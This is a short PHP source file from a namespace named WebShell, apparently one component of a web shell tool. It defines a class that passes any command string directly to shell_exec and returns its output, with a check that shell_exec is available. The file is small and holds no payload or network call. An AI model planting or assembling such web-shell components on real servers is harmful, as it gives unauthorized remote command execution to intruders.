<?php
namespace WebShell;

class ShellExecExecutionMethod implements ExecutionMethod
{
    public function execute(string $cmd): string
    {
        return shell_exec($cmd);
    }

    public function isAvailable(): bool
    {
        return function_exists('shell_exec');
    }
}
?>
